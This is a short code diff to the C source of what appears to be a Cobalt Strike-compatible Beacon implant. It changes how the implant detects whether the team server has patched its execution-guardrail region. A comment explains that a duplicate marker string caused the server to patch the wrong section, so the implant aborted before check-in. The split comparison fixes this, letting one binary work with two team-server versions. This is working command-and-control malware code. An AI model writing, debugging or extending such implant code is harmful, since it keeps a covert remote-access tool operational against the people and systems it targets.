@@ -41,9 +41,6 @@ void    * beacon_ptr;
 #define GUARD_LOCAL_IP         8
 #define GUARD_PAYLOAD_CHECKSUM 9
 
-static const char GUARD_MAGIC[] =
-	"GGGGuuuuaaaarrrrddddRRRRaaaaiiiillllssssPPPPaaaayyyyllllooooaaaadddd";
-
 /* Test hook: when set, settings_init uses these instead of the live host env.
  * Call with user==NULL to clear. Production never calls this. */
 static int          env_override_set;
@@ -104,6 +101,20 @@ char myargs[PATCH_SIZE] = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMN
  * The 4.5 TeamServer ignores both regions, so one binary serves 4.5 and 4.9.1. */
 char sleepmask_region[16416] = "SSSSLLLLEEEEPPPPMMMMAAAASSSSKKKK";
 char guard_region[2112] = "GGGGuuuuaaaarrrrddddRRRRaaaaiiiillllssssPPPPaaaayyyyllllooooaaaadddd";
+
+/*
+ * TS BeaconGuardrails.applyPatch does indexOf(the 68-byte marker) on the
+ * whole DLL. A second identical .rdata literal (used only for memcmp) is
+ * found first; the 2048-byte guard blob then overwrites .rdata, guard_region
+ * stays GGGG, memcmp says "patched", checksum fail-closes, SETTING_PUBKEY
+ * stays NULL, rsa_import ARGCHK-aborts before checkin. Split the compare
+ * so the 68-byte needle exists only in guard_region.
+ */
+static int guard_region_is_unpatched(void) {
+	static const char a[] = "GGGGuuuuaaaarrrrddddRRRRaaaaiiii";
+	static const char b[] = "llllssssPPPPaaaayyyyllllooooaaaadddd";
+	return memcmp(guard_region, a, 32) == 0 && memcmp(guard_region + 32, b, 36) == 0;
+}
 
 /* Inverse of BeaconPayload.patchSleepMaskString: [0:4]=XOR key (1..252),
  * [4:8]=BE payload length left in the clear, [8:]=payload XOR key[i%4].
@@ -395,7 +406,7 @@ void settings_init(void * bptr) {
 
 	/* Unpatched template (4.5 TS, or 4.9.1 generation skipped applyPatch):
 	 * the GGGG magic is still sitting in the region — skip the whole chain. */
-	guard_patched = (memcmp(guard_region, GUARD_MAGIC, sizeof(GUARD_MAGIC) - 1) != 0);
+	guard_patched = !guard_region_is_unpatched();
 
 	if (guard_patched) {
 		unsigned char guard_work[GUARD_BLOB_SIZE];
